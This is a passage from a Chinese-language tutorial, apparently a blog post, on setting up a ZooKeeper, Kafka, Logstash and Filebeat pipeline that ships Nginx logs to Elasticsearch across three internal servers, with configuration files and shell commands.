<p>注: zookeeper 集群，每个节点的配置文件都是一样的。所以直接同步过去，不需要做任何修改。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp zoo.cfg 10.10.0.193:/opt/zookeeper/conf/</span><br><span class="line">scp zoo.cfg 10.10.0.194:/opt/zookeeper/conf/</span><br></pre></td></tr></table></figure>

<h3 id="创建myid文件"><a href="#创建myid文件" class="headerlink" title="创建myid文件"></a><strong>创建myid文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.193</span></span><br><span class="line">echo 1 &gt;/tmp/zookeeper/myid</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.194</span></span><br><span class="line">echo 2 &gt;/tmp/zookeeper/myid</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.195</span></span><br><span class="line">echo 3 &gt;/tmp/zookeeper/myid</span><br></pre></td></tr></table></figure>

<h3 id="启动服务-amp-查看节点状态"><a href="#启动服务-amp-查看节点状态" class="headerlink" title="启动服务 &amp; 查看节点状态"></a><strong>启动服务 &amp; 查看节点状态</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.193</span></span><br><span class="line">/opt/zookeeper/bin/zkServer.sh start</span><br><span class="line">/opt/zookeeper/bin/zkServer.sh status</span><br><span class="line"> </span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper/zookeeper-3.4.9/bin/../conf/zoo.cfg</span><br><span class="line">Mode: leader</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.194</span></span><br><span class="line">/opt/zookeeper/bin/zkServer.sh start</span><br><span class="line">/opt/zookeeper/bin/zkServer.sh status</span><br><span class="line">  </span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper/zookeeper-3.4.9/bin/../conf/zoo.cfg</span><br><span class="line">Mode: follower</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.195</span></span><br><span class="line">/opt/zookeeper/bin/zkServer.sh start </span><br><span class="line">/opt/zookeeper/bin/zkServer.sh status</span><br><span class="line"> </span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: /usr/local/zookeeper/zookeeper-3.4.9/bin/../conf/zoo.cfg</span><br><span class="line">Mode: follower</span><br></pre></td></tr></table></figure>

<p><strong>此时zookeeper集群配置完成</strong></p>
<h2 id="配置Kafka-Broker集群"><a href="#配置Kafka-Broker集群" class="headerlink" title="配置Kafka Broker集群"></a><strong>配置Kafka Broker集群</strong></h2><p>Kafka官网: <a href="http://kafka.apache.org/" target="_blank" rel="noopener">http://kafka.apache.org/</a></p>
<p>配置 10.10.0.193 节点</p>
<h3 id="安装，配置-kafka"><a href="#安装，配置-kafka" class="headerlink" title="安装，配置 kafka"></a><strong>安装，配置 kafka</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解压程序</span></span><br><span class="line">tar -xzvf kafka_2.11-1.0.1.tgz -C /opt/</span><br><span class="line">mv /opt/kafka_2.11-1.0.1 /opt/kafka</span><br></pre></td></tr></table></figure>

<h3 id="编写配置文件-1"><a href="#编写配置文件-1" class="headerlink" title="编写配置文件"></a><strong>编写配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/kafka/conf/server.properties</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################ Server Basics #############################</span></span></span><br><span class="line">broker.id=1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################ Socket Server Settings #############################</span></span></span><br><span class="line">num.network.threads=3</span><br><span class="line"><span class="meta">#</span><span class="bash"> The number of threads doing disk I/O</span></span><br><span class="line">num.io.threads=8</span><br><span class="line"><span class="meta">#</span><span class="bash"> The send buffer (SO_SNDBUF) used by the socket server</span></span><br><span class="line">socket.send.buffer.bytes=102400</span><br><span class="line"><span class="meta">#</span><span class="bash"> The receive buffer (SO_RCVBUF) used by the socket server</span></span><br><span class="line">socket.receive.buffer.bytes=102400</span><br><span class="line"><span class="meta">#</span><span class="bash"> The maximum size of a request that the socket server will accept (protection against OOM)</span></span><br><span class="line">socket.request.max.bytes=104857600</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################ Log Basics #############################</span></span></span><br><span class="line">log.dirs=/opt/kafka/data</span><br><span class="line">num.partitions=6</span><br><span class="line">num.recovery.threads.per.data.dir=1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################ Log Flush Policy #############################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The number of messages to accept before forcing a flush of data to disk</span></span><br><span class="line"><span class="meta">#</span><span class="bash">log.flush.interval.messages=10000</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The maximum amount of time a message can sit <span class="keyword">in</span> a <span class="built_in">log</span> before we force a flush</span></span><br><span class="line"><span class="meta">#</span><span class="bash">log.flush.interval.ms=1000</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################ Log Retention Policy #############################</span></span></span><br><span class="line">log.retention.hours=60</span><br><span class="line">log.segment.bytes=1073741824</span><br><span class="line">log.retention.check.interval.ms=300000</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">############################ Zookeeper #############################</span></span></span><br><span class="line">zookeeper.connect=10.10.0.193:2181,10.10.0.194:2181,10.10.0.195:2181</span><br><span class="line">zookeeper.connection.timeout.ms=6000</span><br></pre></td></tr></table></figure>

<h3 id="同步配置文件到其他两台节点"><a href="#同步配置文件到其他两台节点" class="headerlink" title="同步配置文件到其他两台节点"></a><strong>同步配置文件到其他两台节点</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp server.properties 10.10.0.194:/opt/kafka/config/</span><br><span class="line">scp server.properties 10.10.0.195:/opt/kafka/config/</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改 broker.id</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.194</span></span><br><span class="line">broker.id=2</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.195</span></span><br><span class="line">broker.id=3</span><br></pre></td></tr></table></figure>

<p><strong>注: 其他两个节点的配置文件也基本相同，只有一个参数需要修改 broker.id 。 它用于唯一标识节点，所以绝对不能相同，不然会节点冲突。</strong></p>
<h3 id="配置主机名对应IP的解析"><a href="#配置主机名对应IP的解析" class="headerlink" title="配置主机名对应IP的解析"></a><strong>配置主机名对应IP的解析</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"> </span><br><span class="line">10.10.0.193 elk-01</span><br><span class="line">10.10.0.194 elk-02</span><br><span class="line">10.10.0.195 elk-03</span><br><span class="line"> </span><br><span class="line"># 记得同步到其他两台节点</span><br></pre></td></tr></table></figure>

<h3 id="启动服务-1"><a href="#启动服务-1" class="headerlink" title="启动服务"></a><strong>启动服务</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup /opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties &amp;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 其他两台节点启动方式相同</span></span><br><span class="line"></span><br><span class="line">在kafka中创建topic</span><br><span class="line">/opt/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic nginxlog</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">可以增加topic分区,当然也可在创建时把--partitions增大</span></span><br><span class="line">/opt/kafka/bin/kafka-topics.sh --zookeeper localhost:2181  --alter --topic nginxlog --partitions 10</span><br></pre></td></tr></table></figure>

<p><strong>Kafka+ZooKeeper集群配置完成</strong></p>
<h2 id="配置位于架构图中第二层的Logstash服务"><a href="#配置位于架构图中第二层的Logstash服务" class="headerlink" title="配置位于架构图中第二层的Logstash服务"></a><strong>配置位于架构图中第二层的Logstash服务</strong></h2><p>配置 10.10.0.193节点</p>
<h3 id="安装，配置-logstash"><a href="#安装，配置-logstash" class="headerlink" title="安装，配置 logstash"></a><strong>安装，配置 logstash</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解压程序</span></span><br><span class="line">tar -xzvf logstash-6.2.2.tar.gz -C /opt/</span><br><span class="line">mv /opt/logstash-6.2.2 /opt/logstash</span><br></pre></td></tr></table></figure>

<h3 id="编写配置文件-2"><a href="#编写配置文件-2" class="headerlink" title="编写配置文件"></a><strong>编写配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/logstash/config/logstash_in_kafka.conf</span><br><span class="line"></span><br><span class="line">input &#123;</span><br><span class="line">    beats &#123;</span><br><span class="line">    port =&gt; 5044</span><br><span class="line">    codec =&gt; "json"</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">  kafka &#123;</span><br><span class="line">    bootstrap_servers =&gt; "10.10.0.193:9092,10.10.0.194:9092,10.10.0.195:9092"</span><br><span class="line">    topic_id =&gt; "nginxlog"</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta"> #</span><span class="bash"> stdout &#123;codec =&gt; json&#125;  调试时打开</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启动服务-2"><a href="#启动服务-2" class="headerlink" title="启动服务"></a><strong>启动服务</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup /opt/logstash/bin/logstash -f /opt/logstash/config/logstash_in_kafka.conf &amp;</span><br></pre></td></tr></table></figure>

<p>10.10.0.194 节点的这块配置，与上述完全相同。（略）</p>
<p><strong>位于第二层、数据处理层的 Logstash 配置完成</strong></p>
<h2 id="配置数据采集层，业务服务器-Filebeat"><a href="#配置数据采集层，业务服务器-Filebeat" class="headerlink" title="配置数据采集层，业务服务器+Filebeat"></a><strong>配置数据采集层，业务服务器+Filebeat</strong></h2><h3 id="定制Nginx日志格式"><a href="#定制Nginx日志格式" class="headerlink" title="定制Nginx日志格式"></a><strong>定制Nginx日志格式</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log_format json &apos;&#123;&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&apos;</span><br><span class="line">                 &apos;&quot;slbip&quot;:&quot;$remote_addr&quot;,&apos;</span><br><span class="line">                 &apos;&quot;clientip&quot;:&quot;$http_x_forwarded_for&quot;,&apos;</span><br><span class="line">                 &apos;&quot;serverip&quot;:&quot;$server_addr&quot;,&apos;</span><br><span class="line">                 &apos;&quot;size&quot;:$body_bytes_sent,&apos;</span><br><span class="line">                 &apos;&quot;responsetime&quot;:$request_time,&apos;</span><br><span class="line">                 &apos;&quot;domain&quot;:&quot;$host&quot;,&apos;</span><br><span class="line">                 &apos;&quot;method&quot;:&quot;$request_method&quot;,&apos;</span><br><span class="line">                 &apos;&quot;requesturi&quot;:&quot;$request_uri&quot;,&apos;</span><br><span class="line">                 &apos;&quot;url&quot;:&quot;$uri&quot;,&apos;</span><br><span class="line">                 &apos;&quot;appversion&quot;:&quot;$HTTP_APP_VERSION&quot;,&apos;</span><br><span class="line">                 &apos;&quot;referer&quot;:&quot;$http_referer&quot;,&apos;</span><br><span class="line">                 &apos;&quot;agent&quot;:&quot;$http_user_agent&quot;,&apos;</span><br><span class="line">                 &apos;&quot;status&quot;:&quot;$status&quot;,&apos;</span><br><span class="line">                 &apos;&quot;devicecode&quot;:&quot;$HTTP_HA&quot;&#125;&apos;;</span><br><span class="line">                  </span><br><span class="line"># 在虚拟主机配置中调用</span><br><span class="line">access_log  /var/log/nginx/access.log json;</span><br></pre></td></tr></table></figure>

<h3 id="安装-Filebeat"><a href="#安装-Filebeat" class="headerlink" title="安装 Filebeat"></a><strong>安装 Filebeat</strong></h3><p>Filebeat 也是 Elasticsearch 公司的产品，在官网可以下载。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> rpm 包安装</span></span><br><span class="line">yum install filebeat-6.2.2-x86_64.rpm -y</span><br></pre></td></tr></table></figure>

<h3 id="编写-Filebeat-配置文件"><a href="#编写-Filebeat-配置文件" class="headerlink" title="编写 Filebeat 配置文件"></a><strong>编写 Filebeat 配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim  /etc/filebeat/filebeat.yml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##################### Filebeat Configuration Example #########################</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This file is an example configuration file highlighting only the most common</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> options. The filebeat.reference.yml file from the same directory contains all the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> supported options with more comments. You can use it as a reference.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You can find the full configuration reference here:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://www.elastic.co/guide/en/beats/filebeat/index.html</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For more available modules and options, please see the filebeat.reference.yml sample</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> configuration file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">=========================== Filebeat prospectors =============================</span></span><br><span class="line"></span><br><span class="line">filebeat.prospectors:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Each - is a prospector. Most options can be <span class="built_in">set</span> at the prospector level, so</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> you can use different prospectors <span class="keyword">for</span> various configurations.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Below are the prospector specific configurations.</span></span><br><span class="line"></span><br><span class="line">- type: log</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Change to <span class="literal">true</span> to <span class="built_in">enable</span> this prospector configuration.</span></span><br><span class="line">  enabled: true</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Paths that should be crawled and fetched. Glob based paths.</span></span><br><span class="line">  paths:</span><br><span class="line">    - /var/log/nginx/access.log</span><br><span class="line">    #- c:\programdata\elasticsearch\logs\*</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Exclude lines. A list of regular expressions to match. It drops the lines that are</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> matching any regular expression from the list.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">exclude_lines: [<span class="string">'^DBG'</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Include lines. A list of regular expressions to match. It exports the lines that are</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> matching any regular expression from the list.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">include_lines: [<span class="string">'^ERR'</span>, <span class="string">'^WARN'</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Exclude files. A list of regular expressions to match. Filebeat drops the files that</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> are matching any regular expression from the list. By default, no files are dropped.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">exclude_files: [<span class="string">'.gz$'</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Optional additional fields. These fields can be freely picked</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> to add additional information to the crawled <span class="built_in">log</span> files <span class="keyword">for</span> filtering</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">fields:</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">  level: debug</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">  review: 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"><span class="comment">## Multiline options</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Mutiline can be used <span class="keyword">for</span> <span class="built_in">log</span> messages spanning multiple lines. This is common</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">for</span> Java Stack Traces or C-Line Continuation</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> The regexp Pattern that has to be matched. The example pattern matches all lines starting with [</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">multiline.pattern: ^\[</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Defines <span class="keyword">if</span> the pattern <span class="built_in">set</span> under pattern should be negated or not. Default is <span class="literal">false</span>.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">multiline.negate: <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Match can be <span class="built_in">set</span> to <span class="string">"after"</span> or <span class="string">"before"</span>. It is used to define <span class="keyword">if</span> lines should be append to a pattern</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> that was (not) matched before or after or as long as a pattern is not matched based on negate.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Note: After is the equivalent to previous and before is the equivalent to to next <span class="keyword">in</span> Logstash</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">multiline.match: after</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">============================= Filebeat modules ===============================</span></span><br><span class="line"></span><br><span class="line">filebeat.config.modules:</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Glob pattern <span class="keyword">for</span> configuration loading</span></span><br><span class="line">  path: $&#123;path.config&#125;/modules.d/*.yml</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Set to <span class="literal">true</span> to <span class="built_in">enable</span> config reloading</span></span><br><span class="line">  reload.enabled: false</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Period on <span class="built_in">which</span> files under path should be checked <span class="keyword">for</span> changes</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">reload.period: 10s</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==================== Elasticsearch template setting ==========================</span></span><br><span class="line"></span><br><span class="line">setup.template.settings:</span><br><span class="line">  index.number_of_shards: 3</span><br><span class="line"><span class="meta">  #</span><span class="bash">index.codec: best_compression</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">_source.enabled: <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">================================ General =====================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The name of the shipper that publishes the network data. It can be used to group</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> all the transactions sent by a single shipper <span class="keyword">in</span> the web interface.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">name:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The tags of the shipper are included <span class="keyword">in</span> their own field with each</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> transaction published.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tags: [<span class="string">"service-X"</span>, <span class="string">"web-tier"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Optional fields that you can specify to add additional information to the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> output.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">fields:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  env: staging</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">============================== Dashboards =====================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> These settings control loading the sample dashboards to the Kibana index. Loading</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the dashboards is disabled by default and can be enabled either by setting the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> options here, or by using the `-setup` CLI flag or the `setup` <span class="built_in">command</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">setup.dashboards.enabled: <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The URL from <span class="built_in">where</span> to download the dashboards archive. By default this URL</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> has a value <span class="built_in">which</span> is computed based on the Beat name and version. For released</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> versions, this URL points to the dashboard archive on the artifacts.elastic.co</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> website.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">setup.dashboards.url:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">============================== Kibana =====================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This requires a Kibana endpoint configuration.</span></span><br><span class="line">setup.kibana:</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Kibana Host</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Scheme and port can be left out and will be <span class="built_in">set</span> to the default (http and 5601)</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> In <span class="keyword">case</span> you specify and additional path, the scheme is required: http://localhost:5601/path</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> IPv6 addresses should always be defined as: https://[2001:db8::1]:5601</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">host: <span class="string">"localhost:5601"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">============================= Elastic Cloud ==================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> These settings simplify using filebeat with the Elastic Cloud (https://cloud.elastic.co/).</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The cloud.id setting overwrites the `output.elasticsearch.hosts` and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> `setup.kibana.host` options.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You can find the `cloud.id` <span class="keyword">in</span> the Elastic Cloud web UI.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cloud.id:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The cloud.auth setting overwrites the `output.elasticsearch.username` and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> `output.elasticsearch.password` settings. The format is `&lt;user&gt;:&lt;pass&gt;`.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cloud.auth:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">================================ Outputs =====================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Configure what output to use when sending the data collected by the beat.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  console:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    pretty: <span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">-------------------------- Elasticsearch output ------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="bash">output.elasticsearch:</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Array of hosts to connect to.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">hosts: [<span class="string">"elk-01:9200"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Optional protocol and basic auth credentials.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">protocol: <span class="string">"https"</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash">username: <span class="string">"elastic"</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash">password: <span class="string">"changeme"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">----------------------------- Logstash output --------------------------------</span></span><br><span class="line">output.logstash:</span><br><span class="line"><span class="meta">  #</span><span class="bash"> The Logstash hosts</span></span><br><span class="line">  hosts: ["elk-01:5044"]</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Optional SSL. By default is off.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> List of root certificates <span class="keyword">for</span> HTTPS server verifications</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">ssl.certificate_authorities: [<span class="string">"/etc/pki/root/ca.pem"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Certificate <span class="keyword">for</span> SSL client authentication</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">ssl.certificate: <span class="string">"/etc/pki/client/cert.pem"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Client Certificate Key</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">ssl.key: <span class="string">"/etc/pki/client/cert.key"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">================================ Logging =====================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Sets <span class="built_in">log</span> level. The default <span class="built_in">log</span> level is info.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Available <span class="built_in">log</span> levels are: error, warning, info, debug</span></span><br><span class="line"><span class="meta">#</span><span class="bash">logging.level: debug</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> At debug level, you can selectively <span class="built_in">enable</span> logging only <span class="keyword">for</span> some components.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">enable</span> all selectors use [<span class="string">"*"</span>]. Examples of other selectors are <span class="string">"beat"</span>,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">"publish"</span>, <span class="string">"service"</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">logging.selectors: [<span class="string">"*"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">============================== Xpack Monitoring ===============================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> filebeat can <span class="built_in">export</span> internal metrics to a central Elasticsearch monitoring</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cluster.  This requires xpack monitoring to be enabled <span class="keyword">in</span> Elasticsearch.  The</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> reporting is disabled by default.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set to <span class="literal">true</span> to <span class="built_in">enable</span> the monitoring reporter.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">xpack.monitoring.enabled: <span class="literal">false</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment to send the metrics to Elasticsearch. Most settings from the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Elasticsearch output are accepted here as well. Any setting that is not <span class="built_in">set</span> is</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> automatically inherited from the Elasticsearch output configuration, so <span class="keyword">if</span> you</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> have the Elasticsearch output configured, you can simply uncomment the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> following line.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">xpack.monitoring.elasticsearch:</span></span><br></pre></td></tr></table></figure>

<h3 id="启动服务-3"><a href="#启动服务-3" class="headerlink" title="启动服务"></a><strong>启动服务</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/filebeat start</span><br></pre></td></tr></table></figure>

<p><strong>数据采集层，Filebeat配置完成。</strong></p>
<p>现在业务服务器上的日志数据已经在源源不断的写入缓存了。</p>
<h2 id="配置位于架构图中的第三层，数据转发层"><a href="#配置位于架构图中的第三层，数据转发层" class="headerlink" title="配置位于架构图中的第三层，数据转发层"></a><strong>配置位于架构图中的第三层，数据转发层</strong></h2><p>10.10.0.195    logstash 安装过程和193/194一样，参考上面步骤。</p>
<h3 id="编写Logstash配置文件"><a href="#编写Logstash配置文件" class="headerlink" title="编写Logstash配置文件"></a><strong>编写Logstash配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/logstash/config/kafka_to_es.conf</span><br><span class="line"></span><br><span class="line">input &#123;</span><br><span class="line">        kafka &#123;</span><br><span class="line">            bootstrap_servers =&gt; "10.10.0.193:9092,10.10.0.194:9092"</span><br><span class="line">            auto_offset_reset =&gt; "latest"</span><br><span class="line">            group_id =&gt; "logstash"</span><br><span class="line">            consumer_threads =&gt; 3</span><br><span class="line">            decorate_events =&gt; true</span><br><span class="line">            topics =&gt; ["nginxlog"]</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">         if [type] == "nginxlog" &#123;</span><br><span class="line">                mutate &#123;</span><br><span class="line">                remove_field =&gt;</span><br><span class="line">["slbip","kafka","domain","serverip","url","@version","offset","input_type","count","sourc</span><br><span class="line">e","fields","beat.hostname","host","tags"]</span><br><span class="line">                        &#125; </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line"><span class="meta">#</span><span class="bash">       stdout &#123;codec =&gt; json&#125;</span></span><br><span class="line">        elasticsearch &#123;</span><br><span class="line">            hosts =&gt; ["10.10.0.193:9200","10.10.0.194:9200"]</span><br><span class="line">            timeout =&gt; 300</span><br><span class="line">            index =&gt; "nginxlog"</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

